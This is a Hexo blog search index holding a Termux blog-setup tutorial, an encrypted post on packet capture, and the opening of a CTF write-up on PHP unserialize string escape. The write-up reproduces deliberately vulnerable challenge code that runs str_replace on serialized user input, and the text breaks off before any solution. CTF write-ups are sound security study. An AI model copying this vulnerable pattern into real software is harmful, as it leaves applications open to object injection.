<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>从零开始的hexo博客搭建</title>
      <link href="/2024/01/24/hexoblog/"/>
      <url>/2024/01/24/hexoblog/</url>
      
        <content type="html"><![CDATA[<h1 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h1><p>因为想总结一下博客的搭建过程，但是忘记都改了什么地方，所以干脆直接重新搭建一次好了</p><h1 id="基本安装"><a href="#基本安装" class="headerlink" title="基本安装"></a>基本安装</h1><p>首先我们要在设备上安装nodejs，我这里使用的是termux环境，其他linux环境和windows环境应该大同小异，执行以下命令以安装基础包：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkg install nodejs</span><br></pre></td></tr></table></figure><p>然后安装hexo，这里是hexo官方的安装方法</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br><span class="line">hexo init blog #blog只是一个名字，可以改成自己想要的</span><br><span class="line">cd blog</span><br><span class="line">npm install</span><br><span class="line">hexo server #启动hexo博客</span><br></pre></td></tr></table></figure><h1 id="主题安装"><a href="#主题安装" class="headerlink" title="主题安装"></a>主题安装</h1><p>这里安装了freemind-bithack这个主题，后面我们会改动这个主题，使其更加实用<br>安装命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd blog/theme #进入博客的theme目录</span><br><span class="line">git clone https://github.com/Ares-X/hexo-theme-freemind.bithack</span><br><span class="line">mv hexo-theme-freemind.bithack freemind.bithack #将名字改为freemind.bithack</span><br><span class="line">npm install hexo-tag-bootstrap --save</span><br><span class="line">npm install hexo-generator-search --save</span><br></pre></td></tr></table></figure><p>接下来我们启用这个主题，执行以下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hexo new page categories #创建分类页面</span><br><span class="line">nano source/categories/index.md </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改页面下的index.md，在头部加入一行</span></span><br><span class="line">layout: categories #与页面名称相同</span><br><span class="line">mv index.md index.html #将md后缀改为html</span><br></pre></td></tr></table></figure><p>类似的还有tags和about页面，也是按照相同的方法修改<br>然后在hexo根目录修改（下划线）config.yml，将其中的theme一项改为freemind.bithack<br>然后将主题目录里的（下划线）config.yml移动到根目录并且改名：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp themes/freemind.bithack/_config.yml ./_config.freemind.bithack.yml</span><br></pre></td></tr></table></figure><p>hexo clean &amp;&amp; hexo g &amp;&amp; hexo s 本地启动就可以看效果了</p><h1 id="主题修改"><a href="#主题修改" class="headerlink" title="主题修改"></a>主题修改</h1><p>这个主题虽然还算不错，但是还有很多问题，并且有一些功能需要我们自己加上去</p><h2 id="分级分类"><a href="#分级分类" class="headerlink" title="分级分类"></a>分级分类</h2><p>这个主题最麻烦的就是分级分类，本来hexo是支持分级分类的，但是这个主题不知道为什么把分级分类给关了，这里需要我们手动修改一些文件来实现<br>首先我们先修改侧边栏的分类，进入主题目录，找到layout&#x2F;（下划线）widget&#x2F;category.ejs这个文件，将其后缀加上.bak备份，然后创建同名文件（不要bak），写入以下内容：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;% <span class="keyword">if</span> (site.<span class="property">categories</span>.<span class="property">length</span>)&#123; %&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;widget tag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">h3</span> <span class="attr">class</span>=<span class="string">&quot;title&quot;</span>&gt;</span>&lt;%= __(&#x27;categories&#x27;) %&gt;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">     &lt;%- list_categories(site.categories) %&gt; </span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;% &#125; %&gt; </span><br></pre></td></tr></table></figure><p>这样侧边栏就有分级目录了，我们再来修改layout&#x2F;categories.ejs这个文件，同样我们先备份，然后找到row page这一类，将其内容改成上面的，即修改成这样：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;div <span class="keyword">class</span>=<span class="string">&quot;row page&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">        &lt;% <span class="keyword">if</span> (theme.<span class="property">widgets</span>.<span class="property">length</span>) &#123; %&gt;</span><br><span class="line">            <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-md-9&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        &lt;% &#125; else &#123; %&gt;</span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-md-12&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        &lt;% &#125; %&gt;</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;top_search&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&lt;% if (site.categories.length)&#123; %&gt;</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;widget tag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">h3</span> <span class="attr">class</span>=<span class="string">&quot;title&quot;</span>&gt;</span>&lt;%= __(&#x27;categories&#x27;) %&gt;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">     &lt;%- list_categories(site.categories) %&gt;</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">&lt;% &#125; %&gt;</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>然后先备份后改动（下划线）partical&#x2F;post&#x2F;category.ejs文件，在li标签处修改，如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;li&gt;</span><br><span class="line">    &lt;%- cats.<span class="title function_">join</span>(<span class="string">&#x27; &#x27;</span>) %&gt;</span><br><span class="line">&lt;% <span class="keyword">if</span> (site.<span class="property">categories</span>.<span class="property">length</span>)&#123; %&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;widget tag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">h3</span> <span class="attr">class</span>=<span class="string">&quot;title&quot;</span>&gt;</span>&lt;%= __(&#x27;All Categories&#x27;) %&gt;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">     &lt;%- list_categories(site.categories) %&gt;</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;% &#125; %&gt;</span><br><span class="line">  &lt;/li&gt;</span><br></pre></td></tr></table></figure><p>保存启动hexo即可<br><strong>注意：还有一种分级目录的js代码，这里也给出</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;% <span class="keyword">if</span> (theme.<span class="property">widgets</span>.<span class="property">length</span>) &#123; %&gt;</span><br><span class="line">    &lt;div class=&quot;col-md-9&quot;&gt;</span><br><span class="line">&lt;% &#125; else &#123; %&gt;</span><br><span class="line">    &lt;div class=&quot;col-md-12&quot;&gt;</span><br><span class="line">&lt;% &#125; %&gt;</span><br><span class="line"></span><br><span class="line">&lt;div id=&quot;top_search&quot;&gt;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">     &lt;% if (site.categories.length)&#123; %&gt;</span><br><span class="line">        &lt;div class=&quot;category-block&quot;&gt;</span><br><span class="line">                &lt;h3 class=&quot;asidetitle&quot;&gt;&lt;%= __(&#x27;categories&#x27;) %&gt;&lt;/h3&gt;</span><br><span class="line">                        &lt;%- list_categories(site.categories) %&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">&lt;% &#125; %&gt;</span><br></pre></td></tr></table></figure><h2 id="加密博客"><a href="#加密博客" class="headerlink" title="加密博客"></a>加密博客</h2><p>有时一些文章涉及到src，src涉及到某些公司，为了保密等原因，需要为博客加密，hexo很好地支持这个功能，只需要安装一个模块就好了：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-blog-encrypt</span><br></pre></td></tr></table></figure><p>模块安装好之后我们只要在头部添加password就可以给单篇文章加密，比如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">title: example</span><br><span class="line">password: password</span><br></pre></td></tr></table></figure><p>其他给多篇文章加密的方法这里不在赘述，可以参考：<a href="https://xsin.gitee.io/2019/01/11/hexo-blog-encrypt/">https://xsin.gitee.io/2019/01/11/hexo-blog-encrypt/</a><br>可能会出现输了密码没反应的情况，查阅资料得知，这是因为该模块对http的支持不好，导致在内网环境下无法使用，同时，因为浏览器无条件信任http所以使用回环地址访问是可以的，这个问题不需要担心，只要上传到github后使用https就迎刃而解了。详见这篇文章：<a href="https://d0n9x1n.dev/post/619/">https://d0n9x1n.dev/post/619/</a></p><h2 id="个性化"><a href="#个性化" class="headerlink" title="个性化"></a>个性化</h2><p>修改（下划线）config.yml以及主题的yml配置可以使得个性化，这里只讲一些重要的配置，请将以下给出的地方修改好：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Pagination</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># Set per_page to 0 to disable pagination</span></span></span><br><span class="line">per_page: 0</span><br><span class="line">pagination_dir: page</span><br></pre></td></tr></table></figure><h2 id="接入Github-Pages"><a href="#接入Github-Pages" class="headerlink" title="接入Github Pages"></a>接入Github Pages</h2><p>这个因为比较麻烦，就只写一点点注意事项了：<br>1.执行命令：<code>npm install hexo-deployer-git --save</code><br>2.修改（下划线）config.yml：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Deployment</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># Docs: https://hexo.io/docs/one-command-deployment</span></span></span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: git@github.com:hustler0000/hustler0000.github.io.git</span><br><span class="line">  branch: main</span><br></pre></td></tr></table></figure><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>1.评论可以使用gitalk<br>2.浏览量统计可以使用不蒜子<br><strong>因为博客还没有很多人看所以就不设以上两项了</strong><br>3.像主题目录下的post目录里面，有很多可以修改使得博客更美观的地方，css也是，以后有机会再慢慢研究<br>4.可以修改（下划线）config.freemind.bithack.yml（主题配置文件）来使得没有配置的页面重定向，避免不必要的错误：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">menu:</span><br><span class="line">  - title: Archives</span><br><span class="line">    url: archives</span><br><span class="line">    intro: &quot;All the articles.&quot;</span><br><span class="line">    # icon: &quot;fa fa-archive&quot;</span><br><span class="line">  - title: Categories</span><br><span class="line">    url: categories</span><br><span class="line">    intro: &quot;All the categories.&quot;</span><br><span class="line">    # icon: &quot;fa fa-folder&quot;</span><br><span class="line">  - title: Tags</span><br><span class="line">    url: tags</span><br><span class="line">    intro: &quot;All the tags.&quot;</span><br><span class="line">    # icon: &quot;fa fa-tags&quot;</span><br><span class="line">  - title: About</span><br><span class="line">    url: about</span><br><span class="line">    intro: &quot;About me.&quot;</span><br><span class="line">    # icon: &quot;fa fa-user&quot;</span><br><span class="line">  - title: RSS</span><br><span class="line">    url: archives           #这里就让没有配置的RSS界面跳转到archives了</span><br><span class="line">    intro: &quot;Subscribe me.&quot;</span><br><span class="line">    # icon: &quot;fa fa-user&quot;</span><br></pre></td></tr></table></figure><h1 id="写作技巧"><a href="#写作技巧" class="headerlink" title="写作技巧"></a>写作技巧</h1><h2 id="文件头格式"><a href="#文件头格式" class="headerlink" title="文件头格式"></a>文件头格式</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: 文章标题</span><br><span class="line">date: 2023-01-01 01:01:00 #日期和时间，需要写两位</span><br><span class="line">tag: [笔记,编程语言] #标签</span><br><span class="line">categories:</span><br><span class="line"><span class="bullet">-</span> 编程语言     #有几种写法，像这种写法只会把文章分类到</span><br><span class="line"><span class="bullet">-</span> C          #“编程语言——C”这一个分级分类下</span><br><span class="line"></span><br><span class="line">categories:</span><br><span class="line"><span class="bullet">-</span> [M1,s1]    #这样会将文章同时分类到M1——s1</span><br><span class="line">-[M2,s2]    #和M2——s2两个分级分类目录下</span><br><span class="line"></span><br><span class="line"><span class="section">password: password #如需加密单篇文章，可以这样设置密码</span></span><br><span class="line"><span class="section">---</span></span><br></pre></td></tr></table></figure><h2 id="插入视频"><a href="#插入视频" class="headerlink" title="插入视频"></a>插入视频</h2><p>插入视频也很简单，直接插入一个html语句即可：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">&#x27;/videos/flying.mp4&#x27;</span> <span class="attr">type</span>=<span class="string">&#x27;video/mp4&#x27;</span> <span class="attr">controls</span>=<span class="string">&#x27;controls&#x27;</span>  <span class="attr">width</span>=<span class="string">&#x27;100%&#x27;</span> <span class="attr">height</span>=<span class="string">&#x27;100%&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br><span class="line"></span><br><span class="line">#视频应存在/source/videos目录下，html认为source目录即为根目录，width和height参数可以控制视频窗口的大小，其他参数可以自己尝试</span><br></pre></td></tr></table></figure><h2 id="插入文件下载"><a href="#插入文件下载" class="headerlink" title="插入文件下载"></a>插入文件下载</h2><p>同样的，插入文件下载也非常简单：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/files/firmware.apj&quot;</span>&gt;</span>你想要显示的名字<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">#同上文件应放在/source/files目录下，html认为source目录即为根目录</span><br></pre></td></tr></table></figure><h2 id="插入表格"><a href="#插入表格" class="headerlink" title="插入表格"></a>插入表格</h2><p>这里给出一个表格示例并解释：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">|器件|pixhawk接口1|pixhawk接口2|         #这一行是表头，可以写想要的项</span><br><span class="line">|:---:|:---:|:---:|                   #这一行规定了表格的形式，这里即全部居中</span><br><span class="line">|蜂鸣器|buzzer|——|                     #从这一行开始都是表格内容</span><br><span class="line">|安全开关|switch|——|</span><br><span class="line">|GPS|GPS|I2C|</span><br><span class="line">|6pin线数传（连接机载电脑）|telem 2|——|</span><br><span class="line">|电流计|power|——|</span><br></pre></td></tr></table></figure><h1 id="踩坑总结"><a href="#踩坑总结" class="headerlink" title="踩坑总结"></a>踩坑总结</h1><p>1.正文内容如果有太多类似百分号这些符号，建议使用代码块括起来，不然会引发错误<br>2.修改重要的文件时记得备份<br>3.博客只有你想不到没有做不到</p><hr><p>2024的第一篇文章:)<br>有好多偷懒的地方:(<br>&#96;&#96;&#96;</p>]]></content>
      
      
      <categories>
          
          <category> 速查 </category>
          
          <category> 博客搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> 杂项 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>抓包技巧-App以及小程序抓包总结</title>
      <link href="/2023/12/29/spcapture/"/>
      <url>/2023/12/29/spcapture/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="45ceed1841a38faa8ec5a7a881a404b0ea9849c2627ed5f80e54f00afae793e2"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> Web </category>
          
          <category> Packet Capture </category>
          
          <category> SRC挖掘 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> Packet Capture </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web-字符串反序列化逃逸</title>
      <link href="/2023/12/20/sescape/"/>
      <url>/2023/12/20/sescape/</url>
      
        <content type="html"><![CDATA[<h1 id="题目简述"><a href="#题目简述" class="headerlink" title="题目简述"></a>题目简述</h1><p>题目给出了这样的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;Hanxin.exe.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$Chant</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;chant&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;chant&#x27;</span>] : <span class="string">&#x27;夺命十三枪&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$new_visitor</span> = <span class="keyword">new</span> <span class="title class_">Omg_It_Is_So_Cool_Bring_Me_My_Flag</span>(<span class="variable">$Chant</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$before</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$new_visitor</span>);</span><br><span class="line"><span class="variable">$after</span> = <span class="title class_">Deadly_Thirteen_Spears</span>::<span class="title function_ invoke__">Make_a_Move</span>(<span class="variable">$before</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Movements: &#x27;</span> . <span class="variable">$after</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">unserialize</span>(<span class="variable">$after</span>);</span><br><span class="line">&#125;<span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Even Caused A Glitch...&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>提示有Hanxin.exe.php的页面，打开查看：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>]) === <span class="title function_ invoke__">basename</span>(<span class="keyword">__FILE__</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Deadly_Thirteen_Spears</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$Top_Secret_Long_Spear_Techniques_Manual</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&quot;di_yi_qiang&quot;</span> =&gt; <span class="string">&quot;Lovesickness&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_er_qiang&quot;</span> =&gt; <span class="string">&quot;Heartbreak&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_san_qiang&quot;</span> =&gt; <span class="string">&quot;Blind_Dragon&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_si_qiang&quot;</span> =&gt; <span class="string">&quot;Romantic_charm&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_wu_qiang&quot;</span> =&gt; <span class="string">&quot;Peerless&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_liu_qiang&quot;</span> =&gt; <span class="string">&quot;White_Dragon&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_qi_qiang&quot;</span> =&gt; <span class="string">&quot;Penetrating_Gaze&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_ba_qiang&quot;</span> =&gt; <span class="string">&quot;Kunpeng&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_jiu_qiang&quot;</span> =&gt; <span class="string">&quot;Night_Parade_of_a_Hundred_Ghosts&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_shi_qiang&quot;</span> =&gt; <span class="string">&quot;Overlord&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_shi_yi_qiang&quot;</span> =&gt; <span class="string">&quot;Letting_Go&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_shi_er_qiang&quot;</span> =&gt; <span class="string">&quot;Decisive_Victory&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_shi_san_qiang&quot;</span> =&gt; <span class="string">&quot;Unrepentant_Lethality&quot;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">Make_a_Move</span>(<span class="params"><span class="variable">$move</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="built_in">self</span>::<span class="variable">$Top_Secret_Long_Spear_Techniques_Manual</span> <span class="keyword">as</span> <span class="variable">$index</span> =&gt; <span class="variable">$movement</span>)&#123;</span><br><span class="line">            <span class="variable">$move</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$index</span>, <span class="variable">$movement</span>, <span class="variable">$move</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$move</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Omg_It_Is_So_Cool_Bring_Me_My_Flag</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Chant</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Spear_Owner</span> = <span class="string">&#x27;Nobody&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$chant</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Chant = <span class="variable">$chant</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Spear_Owner = <span class="string">&#x27;Nobody&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;Spear_Owner !== <span class="string">&#x27;MaoLei&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Far away from COOL...&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Omg You&#x27;re So COOOOOL!!! &quot;</span> . <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;FLAG&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>同时，网页下面还有这样的回显：</p><p>Your Movements: O:34:”Omg_It_Is_So_Cool_Bring_Me_My_Flag”:2:{s:5:”Chant”;s:15:”夺命十三枪”;s:11:”Spear_Owner”;s:6:”Nobody”;}<br>Far away from COOL…</p><p><strong>注意：在php中，中文的字符串长度是根据所占字节来决定的，utf-8编码下每个中文字符所占字节为3，所以夺命十三枪的长度是15</strong></p><p>题目的大致意思，是让我们通过chant传参，将Spear_Owner改为Maolei，同时，我们传入的参数会根据一定规则被替换</p><h1 id="逐步题解"><a href="#逐步题解" class="headerlink" 